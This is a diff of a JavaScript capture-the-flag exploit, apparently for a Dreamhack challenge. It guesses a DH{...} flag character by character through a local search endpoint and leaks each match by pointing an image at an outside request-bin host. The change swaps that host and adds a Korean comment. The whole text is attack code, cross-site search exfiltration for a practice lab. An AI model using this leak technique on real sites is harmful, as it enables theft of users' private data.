@@ -18,7 +18,7 @@
         async function searchAndUpdate(query) {
             const isFound = await req(`http://127.0.0.1:8000/search?keyword=${query}`);
             if (isFound) {
-                img.src = `https://oewybdz.request.dreamhack.games/${query}`;
+                img.src = `https://sqxbtet.request.dreamhack.games/${query}`;
                 return true;
             }
             return false;
@@ -27,7 +27,8 @@
         async function exploit() {
             let chars = "0123456789abcdef}"
             let secret = "DH{";
-            
+
+            // '}'가 발견될 때까지만 반복합니다.
             while (!secret.includes("}")) {
                 let found = false;
                 for (let c of chars) {
